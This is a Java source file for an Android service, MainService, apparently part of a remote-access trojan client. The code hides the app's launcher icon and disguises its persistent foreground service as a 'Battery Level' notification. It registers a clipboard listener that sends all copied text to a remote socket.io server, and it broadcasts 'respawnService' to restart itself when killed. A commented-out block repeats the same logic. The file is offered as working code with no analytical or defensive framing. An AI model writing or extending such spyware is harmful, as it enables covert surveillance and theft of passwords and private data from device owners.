package com.remote.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.telephony.ServiceState;

import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {
    private static Context contextOfApplication;
//    boolean isServiceStarted = false;
//    PowerManager pm;
//    PowerManager.WakeLock wl ;
//
//    public MainService() {
//        super();
//    }
//
//    @Override
//    public IBinder onBind(Intent intent) {
//        // TODO: Return the communication channel to the service.
//        //throw new UnsupportedOperationException("Not yet implemented");
//        return null;
//    }
//
//    @Override
//    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
//
//        start();
//
//        // Hide App Icon
//        PackageManager pkg=this.getPackageManager();
//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
//
//
//
//        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
//            public void onPrimaryClipChanged() {
//                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
//                if (clipboard.hasPrimaryClip()) {
//                    ClipData clipData = clipboard.getPrimaryClip();
//                    if (clipData.getItemCount() > 0) {
//                        CharSequence text = clipData.getItemAt(0).getText();
//                        if (text != null) {
//                            try {
//                                JSONObject data = new JSONObject();
//                                data.put("text", text);
//                                IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
//                            } catch (JSONException e) {
//                                e.printStackTrace();
//                            }
//                        }
//                    }
//                }
//            }
//        };
//
//        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
//        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
//
//
//        contextOfApplication = this;
//        ConnectionManager.startAsync(this);
//        return Service.START_STICKY;
//    }
//
//    public void start(){
//
//        if(isServiceStarted) return;
//
//        isServiceStarted = true;
//
//        try{
//            pm = (PowerManager)getSystemService(Context.POWER_SERVICE);
//
//            if(!pm.isScreenOn()) {
//                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,"ProcessManger:CollectData");
//                wl.acquire(300);
//            }
//            else if (wl.isHeld()) wl.release();
//        }
//        catch(Exception e){
//            e.printStackTrace();
//        }
//
//    }
//
//    @Override
//    public void onDestroy() {
//        isServiceStarted = false;
//        super.onDestroy();
//        sendBroadcast(new Intent("respawnService"));
//    }
//
//    public static Context getContextOfApplication()
//    {
//        return contextOfApplication;
//    }

    @Override
    public void onCreate() {
        super.onCreate();

        PackageManager pkg=this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

//        PackageManager pkg=this.getPackageManager();
//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            public void onPrimaryClipChanged() {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData.getItemCount() > 0) {
                        CharSequence text = clipData.getItemAt(0).getText();
                        if (text != null) {
                            try {
                                JSONObject data = new JSONObject();
                                data.put("text", text);
                                IOSocket.getInstance().getIoSocket().emit("0xCB" , data);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);


        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        sendBroadcast(new Intent("respawnService"));
    }



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }
}
